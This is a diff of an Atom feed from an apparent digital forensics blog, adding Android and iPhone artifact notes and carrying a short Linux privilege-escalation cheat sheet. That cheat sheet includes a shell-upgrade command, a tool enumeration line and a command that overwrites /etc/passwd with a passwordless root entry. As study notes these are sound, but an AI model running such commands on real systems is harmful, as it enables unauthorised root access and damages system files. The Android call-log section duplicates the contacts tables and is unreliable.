@@ -1,5 +1,112 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Digital Forensics</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2020-11-03T00:00:00-06:00</updated><entry><title>Android Artifacts</title><link href="/android-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/android-artifacts.html</id><content type="html"></content><category term="Android"></category><category term="Android"></category><category term="Artifacts"></category></entry><entry><title>Cell Data Record Analysis</title><link href="/cdr.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/cdr.html</id><content type="html"></content><category term="CDR"></category><category term="CDR"></category></entry><entry><title>Elasticsearch O365 Audit Logs</title><link href="/elasticsearch-o365.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/elasticsearch-o365.html</id><content type="html"></content><category term="Mail"></category><category term="ELK"></category><category term="O365"></category></entry><entry><title>iPhone Artifacts</title><link href="/iphone-messaging-and-calls.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/iphone-messaging-and-calls.html</id><summary type="html">&lt;ol&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Digital Forensics</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2020-11-03T00:00:00-06:00</updated><entry><title>Android Artifacts</title><link href="/android-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/android-artifacts.html</id><summary type="html">&lt;p&gt;Android phones do not immediately upgrades but rollouts tend to be taken up slowly (months to years).&lt;/p&gt;
+&lt;p&gt;Google is developer but manufacturers and carriers also have a role in upgrade process&lt;/p&gt;
+&lt;p&gt;Android devices now have full device encryption&lt;/p&gt;
+&lt;h3&gt;Android partitions include...&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;/boot&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/system&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/recovery&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/data&lt;/strong&gt; or &lt;strong&gt;/userdata&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/cache&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/misc&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/sdcard …&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;Android phones do not immediately upgrades but rollouts tend to be taken up slowly (months to years).&lt;/p&gt;
+&lt;p&gt;Google is developer but manufacturers and carriers also have a role in upgrade process&lt;/p&gt;
+&lt;p&gt;Android devices now have full device encryption&lt;/p&gt;
+&lt;h3&gt;Android partitions include...&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;/boot&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/system&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/recovery&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/data&lt;/strong&gt; or &lt;strong&gt;/userdata&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/cache&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/misc&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/sdcard&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/sd-ext&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Vendors may also specify device specific partitions. Not all partitions contain files or data.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;/system&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Contains actual OS of Android other than kernel and ramdisk&lt;/li&gt;
+&lt;li&gt;Contains built-in system and vendor applications&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/boot&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Contains kernel and ramdisk&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/recovery&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Alternative boot partition. Allows for recovery and naintenance including wiping &lt;strong&gt;/data&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Can be utilized to gain privileged access&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/cache&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Application components/data&lt;/li&gt;
+&lt;li&gt;May store some system data for applications to access&lt;/li&gt;
+&lt;li&gt;Can be wiped without loss of functionality&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/data&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Core user data&lt;/li&gt;
+&lt;li&gt;Third-party applications&lt;/li&gt;
+&lt;li&gt;Lots of juicy information in here for digital forensics&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;in &lt;strong&gt;data&lt;/strong&gt; applications are sorted by Application ID.
+Java package naming convention
+- Companies use their reversed Internet domain name to begin their package names—for example, com.example.mypackage for a package named mypackage created by a programmer at example.com.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;/userdata/data&lt;/strong&gt; is credential-encrypted storage&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/user_de/0&lt;/strong&gt; is device encrypted storage&lt;ul&gt;
+&lt;li&gt;0 is first user on device&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Contacts&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Stored at &lt;strong&gt;/data/com.android.providers.contacts/databases/contacts2.db&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Tables&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;accounts&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Account name &lt;strong&gt;myemail@gmail.com&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Account type &lt;strong&gt;com.google&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;raw_contacts&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Display name for contact&lt;/li&gt;
+&lt;li&gt;Time of last interaction with said contact&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;data&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Phone numbers&lt;/li&gt;
+&lt;li&gt;Addresses&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Call Logs&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Stored at &lt;strong&gt;/data/com.android.providers.contacts/databases/contacts2.db&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Tables&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;accounts&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Account name &lt;strong&gt;myemail@gmail.com&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Account type &lt;strong&gt;com.google&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;raw_contacts&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Display name for contact&lt;/li&gt;
+&lt;li&gt;Time of last interaction with said contact&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;data&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;Phone numbers&lt;/li&gt;
+&lt;li&gt;Addresses&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</content><category term="Android"></category><category term="Android"></category><category term="Artifacts"></category></entry><entry><title>Cell Data Record Analysis</title><link href="/cdr.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/cdr.html</id><content type="html"></content><category term="CDR"></category><category term="CDR"></category></entry><entry><title>Elasticsearch O365 Audit Logs</title><link href="/elasticsearch-o365.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/elasticsearch-o365.html</id><content type="html"></content><category term="Mail"></category><category term="ELK"></category><category term="O365"></category></entry><entry><title>iPhone Artifacts</title><link href="/iphone-messaging-and-calls.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/iphone-messaging-and-calls.html</id><summary type="html">&lt;ol&gt;
 &lt;li&gt;Acquisition&lt;/li&gt;
 &lt;li&gt;Apple Device Identifiers&lt;/li&gt;
 &lt;li&gt;iTunes Backups, info.plist&lt;/li&gt;
@@ -42,13 +149,14 @@
 - Unique Device Identifier or UDID (uniquely ID each device Apple).&lt;/p&gt;
 &lt;h3&gt;UDID&lt;/h3&gt;
 &lt;ul&gt;
+&lt;li&gt;The UDID is a 40-character alphanumeric value.&lt;/li&gt;
 &lt;li&gt;Hashed unique values on device: chip ID, Wi-Fi/Bluetooth MAC&lt;/li&gt;
+&lt;li&gt;UDID = SHA1(serial + IMEI or ECID + WiFiMac + BluetoothMac)&lt;/li&gt;
 &lt;li&gt;The UDID is used by Apple to track devices. &lt;/li&gt;
 &lt;li&gt;Uniquely identify a backup on PC. &lt;ul&gt;
 &lt;li&gt;If iOS plugged: UDID stored in Windows registry&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;The UDID is a 40-character alphanumeric value.&lt;/li&gt;
 &lt;li&gt;There are two ways to find out a devices UDID:&lt;ol&gt;
 &lt;li&gt;Unlocked/paired to PC: When iOS device connected iTunes can show UDID: device properties and clicking on Serial No. == UDID&lt;/li&gt;
 &lt;li&gt;Run &lt;strong&gt;devmgmt.msc&lt;/strong&gt; (with iphone plugged in)&lt;ul&gt;
@@ -59,17 +167,14 @@
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;/li&gt;
-&lt;li&gt;USB Devices Artifact: Device Class ID: “Filter column”. &lt;strong&gt;Apple&lt;/strong&gt; or &lt;strong&gt;05AC&lt;/strong&gt; &lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Apple&lt;/strong&gt; or &lt;strong&gt;05AC&lt;/strong&gt; &lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2&gt;3. iTunes Backups&lt;/h2&gt;
 &lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;iTunes tend to backup to PC's at following location:
-&lt;strong&gt;C:\Users&lt;username&gt;\AppData\Roaming\Apple Computer\MobileSync\Backup&lt;/strong&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;May be possible to find multiple copies of same device under separate users.&lt;/p&gt;
-&lt;/li&gt;
+&lt;li&gt;iOS backups on a PC almost identical to data on device&lt;/li&gt;
+&lt;li&gt;iTunes tend to backup to PC's at following location:
+&lt;strong&gt;C:\Users&lt;username&gt;\AppData\Roaming\Apple Computer\MobileSync\Backup&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;May be possible to find multiple copies of same device under separate users.&lt;/li&gt;
 &lt;li&gt;\Backup\ folder, subfolder folders for each backed-up device/UDID. &lt;/li&gt;
 &lt;li&gt;A UDID may be listed multiple times: appended by a 24hr date/time.&lt;/li&gt;
 &lt;li&gt;Files will have no file extension &amp;amp; represent a file on the iOS device. &lt;/li&gt;
@@ -79,19 +184,35 @@
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;li&gt;Apple calculates hash using domain followed by the rest of the path. &lt;/li&gt;
-&lt;li&gt;eg, &lt;strong&gt;/private/var/mobile/Library/SMS/sms.db&lt;/strong&gt; is represented in the backup as HomeDomain-Library/SMS/sms.db whose hash is &lt;strong&gt;3d0d7e5fb2ce288813306e4d4636395e047a3d28&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;eg, &lt;strong&gt;/private/var/mobile/Library/SMS/sms.db&lt;/strong&gt; is represented in the backup as &lt;strong&gt;HomeDomain-Library/SMS/sms.db&lt;/strong&gt; whose hash is &lt;strong&gt;3d0d7e5fb2ce288813306e4d4636395e047a3d28&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;This hash reflect the SQLite database containing these messages.&lt;/li&gt;
 &lt;li&gt;It will be a common hash for many devices&lt;/li&gt;
 &lt;li&gt;A list of all paths &amp;amp; domains can be found in the &lt;strong&gt;manifest.mbdb&lt;/strong&gt; file.&lt;/li&gt;
-&lt;li&gt;iOS 10, Apple changed from &lt;strong&gt;.mbdb&lt;/strong&gt; file to SQLite db &lt;strong&gt;Manifest.db&lt;/strong&gt;.&lt;/li&gt;
-&lt;li&gt;There are three .plist (property) files on PC where Apple device was backed up. &lt;/li&gt;
-&lt;li&gt;Manifest.plist, Status.plist, Info.plist reflect info from device. &lt;/li&gt;
+&lt;li&gt;iOS 10, Apple changed from &lt;strong&gt;.mbdb&lt;/strong&gt; file to SQLite db &lt;strong&gt;Manifest.db&lt;/strong&gt;.&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Manifest.db&lt;/strong&gt; contains two tables (Files and Properties)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Files&lt;/strong&gt; table contains the following fields&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;fileID&lt;/strong&gt; SHA1 hash for the object&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;domain&lt;/strong&gt; domain the object belongs to&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;relativePath&lt;/strong&gt; path from domain to object&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;flags&lt;/strong&gt; is encrypted, is file, is folder&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;file&lt;/strong&gt; binary plistfile stored as binary large object (BLOB)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Along with organizational files and SHA1-files there are three property list files &lt;ul&gt;
+&lt;li&gt;Manifest.plist &lt;/li&gt;
+&lt;li&gt;Status.plist &lt;/li&gt;
+&lt;li&gt;Info.plist &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
 &lt;li&gt;These files do not belong on device itself but contain info about device&lt;ol&gt;
-&lt;li&gt;Info.plist is an XML file:&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Info.plist&lt;/strong&gt; is an XML file:&lt;ul&gt;
+&lt;li&gt;Static header 8-bytes of &lt;strong&gt;bplist00&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;Device Name&lt;/li&gt;
 &lt;li&gt;Display Name&lt;/li&gt;
 &lt;li&gt;GUID&lt;/li&gt;
-&lt;li&gt;ICCID&lt;/li&gt;
+&lt;li&gt;ICCID (Integrated Circuit Card Identifier)&lt;/li&gt;
 &lt;li&gt;IMEI&lt;/li&gt;
 &lt;li&gt;Last Backup Date&lt;/li&gt;
 &lt;li&gt;Phone Number&lt;/li&gt;
@@ -104,13 +225,17 @@
 &lt;li&gt;List of Applications in Library&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Manifest.plist is a binary file: &lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Manifest.plist&lt;/strong&gt; is a binary file: &lt;ul&gt;
 &lt;li&gt;whether or not the backup is encrypted&lt;/li&gt;
 &lt;li&gt;UDID of the device&lt;/li&gt;
 &lt;li&gt;whether or not a passcode was set on the device&lt;/li&gt;
+&lt;li&gt;Application data&lt;/li&gt;
+&lt;li&gt;Applications key including bundle ID, bundle version&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;WasPasswordSet&lt;/strong&gt; &lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;IsEnrypted&lt;/strong&gt; (was backup encryption enabled)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Status.plist file&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Status.plist&lt;/strong&gt; file&lt;ul&gt;
 &lt;li&gt;UDID&lt;/li&gt;
 &lt;li&gt;the state of the backup&lt;/li&gt;
 &lt;li&gt;whether or not it is a full backup.&lt;/li&gt;
@@ -118,6 +243,11 @@
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Domains&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;All the domains are located in &lt;strong&gt;Domains.plist&lt;/strong&gt; stored in &lt;strong&gt;/system/library/backup&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;This file is not backed up&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3&gt;Encrypted backups&lt;/h3&gt;
 &lt;ul&gt;
@@ -200,10 +330,45 @@
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;li&gt;This &lt;strong&gt;plist&lt;/strong&gt; may contain a ton of data. It is up to the third-party developer as to what information is stored in this &lt;strong&gt;plist&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;Can use a third-party app to find Buble Ids such as &lt;a href="https://offcornerdev.com/bundleid.html"&gt;OffCornerDev&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Can use a third-party app to find Bundle Ids such as &lt;a href="https://offcornerdev.com/bundleid.html"&gt;OffCornerDev&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Majority of data on iPhones comes from the directory &lt;strong&gt;/private/var/mobile&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/Library/&lt;/strong&gt; which holds most of the core user data; &lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/Media/&lt;/strong&gt; camera roll, pictures, and videos on the device;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/Containers/&lt;/strong&gt; third-party and core application data on the device.&lt;/li&gt;
+&lt;li&gt;Both types of property list files will store text data and Base-64 encoded data. &lt;/li&gt;
+&lt;li&gt;They may use the base-64 data to store other property list files, pictures, videos, or just additional text stores. &lt;/li&gt;
+&lt;li&gt;Binary and XML plist files: &lt;ul&gt;
+&lt;li&gt;store user and configuration info. eg previous connections to wifi networks&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Also used in 3rd-party app data to store configuration info for each app (eg usernames, install date/times, last opened date/times etc)&lt;/li&gt;
+&lt;li&gt;iOS uses plist files as registry files Contacts, Call Logs, SMS/iMessages&lt;/li&gt;
+&lt;li&gt;Emails, Web History, and more are stored within SQLite databases.&lt;/li&gt;
+&lt;li&gt;plist xml header/footer:
+    &amp;lt;?xml version=”1.0” encoding=”UTF-8”?&amp;gt;
+    &amp;lt;!DOCTYPE plist SYSTEM “file://localhost/System/Library/DTDs/ PropertyList.dtd”&amp;gt;
+    &lt;plist version=”1.0&gt;.
+    &lt;/plist&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;plist&lt;/strong&gt; binary header &lt;strong&gt;bplist00&lt;/strong&gt; &lt;/li&gt;
+&lt;li&gt;SQLite3 header &lt;strong&gt;SQLite format3&lt;/strong&gt; in ASCII&lt;ul&gt;
+&lt;li&gt;iOS uses SQLite version 3.7 which means they use write-ahead logs&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2&gt;10. Anatomy of an application&lt;/h2&gt;
-&lt;p&gt;plist carving&lt;/p&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Mac Artifacts</title><link href="/mac-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/mac-artifacts.html</id><content type="html"></content><category term="Mac"></category><category term="Mac"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Windows Artifacts</title><link href="/windows-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/windows-artifacts.html</id><content type="html"></content><category term="Windows"></category><category term="Windows"></category><category term="Artifacts"></category></entry><entry><title>Docker Certified Associate</title><link href="/docker-certified-associate.html" rel="alternate"></link><published>2020-01-18T00:00:00-06:00</published><updated>2020-01-18T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-01-18:/docker-certified-associate.html</id><summary type="html">&lt;h3&gt;Docker&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Third-party &lt;strong&gt;plist&lt;/strong&gt; files may contyain plain-text passwords&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Binary plist carving&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Export the plist&lt;/li&gt;
+&lt;li&gt;Eaxamine in HxD&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/pug4N6/plist_carver"&gt;plist carver&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Mac Artifacts</title><link href="/mac-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/mac-artifacts.html</id><content type="html"></content><category term="Mac"></category><category term="Mac"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Windows Artifacts</title><link href="/windows-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/windows-artifacts.html</id><content type="html"></content><category term="Windows"></category><category term="Windows"></category><category term="Artifacts"></category></entry><entry><title>Docker Certified Associate</title><link href="/docker-certified-associate.html" rel="alternate"></link><published>2020-01-18T00:00:00-06:00</published><updated>2020-01-18T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-01-18:/docker-certified-associate.html</id><summary type="html">&lt;h3&gt;Docker&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run dans-container
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -463,47 +628,56 @@ docker-compose down
 &lt;span class="c1"&gt;# View running containers. &lt;/span&gt;
 &lt;span class="c1"&gt;# Must be in same folder as docker-compose.yml&lt;/span&gt;
 docker-compose ps
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Certifications"></category><category term="Docker"></category></entry><entry><title>Linux Privilege Escalation</title><link href="/linux-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/linux-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
-&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;
-&lt;span class="n"&gt;stty&lt;/span&gt; &lt;span class="n"&gt;raw&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;
-&lt;span class="n"&gt;fg&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Certifications"></category><category term="Docker"></category></entry><entry><title>Linux Privilege Escalation</title><link href="/linux-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/linux-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;privesc_linux
+UPGRADE SHELL python -c &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
+ctrl-Z
+stty raw -echo
+&lt;span class="nb"&gt;fg&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Enumerate and run this:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;If you don’t see a compiler such as GCC …&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
-&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;
-&lt;span class="n"&gt;stty&lt;/span&gt; &lt;span class="n"&gt;raw&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;
-&lt;span class="n"&gt;fg&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If you don’t see a compiler such as GCC, you …&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;privesc_linux
+UPGRADE SHELL python -c &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
+ctrl-Z
+stty raw -echo
+&lt;span class="nb"&gt;fg&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Enumerate and run this:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 &lt;p&gt;If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
 LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
 related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
-BY HAND 
-1. sudo -l # view users rights has to be tried first for all linux privesc
-2. rw on /etc/passwd → echo root::0:0:root:/root:/bin/bash &amp;gt; /etc/passwd → su
-3. bash_history
-4. find / -perm -4000 2&amp;gt;/dev/null # SUID files - detect by date?
-5. Do all cronjobs look normal and do you have write access to any??
-6. ps aux | grep root == john mysql -u root
-7. If webserver poke around database
-8. Look at original nmap scan for other shite running (nmap localhost)&lt;/p&gt;
